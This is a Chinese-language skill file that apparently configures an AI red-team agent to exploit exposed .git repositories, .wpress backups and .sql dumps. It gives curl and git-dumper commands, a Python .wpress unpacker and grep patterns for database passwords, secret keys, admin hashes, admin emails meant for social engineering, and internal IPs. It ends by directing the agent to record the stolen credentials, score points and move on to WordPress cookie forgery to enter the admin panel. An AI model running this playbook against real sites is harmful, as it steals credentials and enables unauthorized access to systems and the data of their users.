---
name: leak-extractor
description: 敏感暴露与源码备份自动化提取技能：.git 仓库还原提取、.wpress 备份解包、.sql 数据库备份敏感信息挖掘
whenToUse: 当资产探测出 .git 暴露、.sql 数据库备份、.wpress 整站备份或 .zip 源码包时使用
role: vuln-scan
enabled: true
---

# 敏感暴露与源码备份自动化提取技能

在信息收集或目录扫描中命中源码暴露或备份文件时，**不得仅做 HTTP 状态码 200 验证**，必须立即将其完整拉取并提取核心资产信息（数据库账密、系统密钥、管理员邮箱、内部接口）。

---

## 一、.git 仓库泄露提取与关键配置定位

当 `/.git/HEAD` 返回 `ref: refs/heads/...` 时：

### 1. 快速单文件精准提取（最快，无需下完整个库）
通常只需拿到配置文件即可直通后台或数据库：
```bash
# 1) 查看当前分支 commit SHA
curl -k -s "https://target/.git/refs/heads/master" || curl -k -s "https://target/.git/refs/heads/main"

# 2) 查看最近变更与文件索引
curl -k -s "https://target/.git/index" -o /tmp/git_index.bin

# 3) 若为宽松目录浏览，直接抓取配置文件对象：
# Python 解压 git object 单行：
python3 -c "import zlib; print(zlib.decompress(open('/tmp/obj.bin','rb').read()).decode('utf-8', 'ignore'))"
```

### 2. 全量还原工具：`git-dumper`
```bash
# 安装并提取完整 git 仓库
git-dumper https://target/.git/ /tmp/target_source/

# 还原后重点检索：
cd /tmp/target_source
grep -rn "DB_PASSWORD" .
grep -rn "password" . | head -30
grep -rn "secret" . | head -30
```

---

## 二、.wpress 备份包自动化解包（All-in-One WP Migration）

`.wpress` 是 WordPress 常见的全站热备份文件，内部包含所有插件、上传文件与完整的 `database.sql`。

### 提取与解包脚本
如果本地没有 `wpress-extractor`，可以使用如下 Python 脚本进行分块流式提取：
```python
import struct, os, sys

def extract_wpress(file_path, output_dir):
    with open(file_path, 'rb') as f:
        while True:
            header = f.read(4377)
            if not header or len(header) < 4377:
                break
            # wpress block header 解析
            filename = header[:255].decode('utf-8', 'ignore').strip('\x00')
            if not filename:
                break
            size = struct.unpack('>Q', header[255:263])[0]
            target_path = os.path.join(output_dir, filename)
            os.makedirs(os.path.dirname(target_path), exist_ok=True)
            
            # 读取文件内容
            with open(target_path, 'wb') as out_f:
                copied = 0
                while copied < size:
                    chunk = f.read(min(65536, size - copied))
                    if not chunk: break
                    out_f.write(chunk)
                    copied += len(chunk)
            print(f"[+] 提取: {filename} ({size} bytes)")

extract_wpress("target.wpress", "/tmp/wpress_unpacked")
```
解压后直接重点检查：
- `/tmp/wpress_unpacked/database.sql`（全量数据库）
- `/tmp/wpress_unpacked/wp-config.php`（数据库凭据与密钥）

---

## 三、.sql 数据库备份文件核心要素提取

拿到十几 MB 甚至几个 GB 的 `.sql` 备份时，**严禁全文打印**，使用针对性命令提取：

```bash
# 1. 提取系统管理员账号与密码哈希（针对 WordPress）
grep -E "wp_users|users.*VALUES" /path/to/dump.sql | head -10

# 2. 提取网站管理员邮箱（用于社工、撞库或找回密码测试）
grep -E "admin_email" /path/to/dump.sql

# 3. 提取第三方接口密钥与 AccessKey / SecretKey
grep -iE "(access_key|secret_key|api_key|app_secret|token)" /path/to/dump.sql | head -20

# 4. 提取包含的内部网段与内网 IP 地址
grep -oE "10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|192\.168\.[0-9]{1,3}\.[0-9]{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.[0-9]{1,3}\.[0-9]{1,3}" /path/to/dump.sql | sort -u
```

---

## 四、提取后的动作纪律

1. 提取到明文口令或高价值哈希 ➔ 立即调用 `redteam_credential_add`；
2. 提取到数据库配置（如 `DB_PASSWORD`） ➔ 立即调用 `redteam_score_hit`（`code="db-credential"`，得分 50 分）；
3. 发现完整的源码或配置 ➔ 在 `redteam_vuln_add` 将漏洞状态由 `candidate` 推进为 `exploited`；
4. 衔接利用：若获取到了 WordPress 密钥，立刻调用技能 `wordpress-exploit` 进行 Cookie 伪造并尝试进入后台。
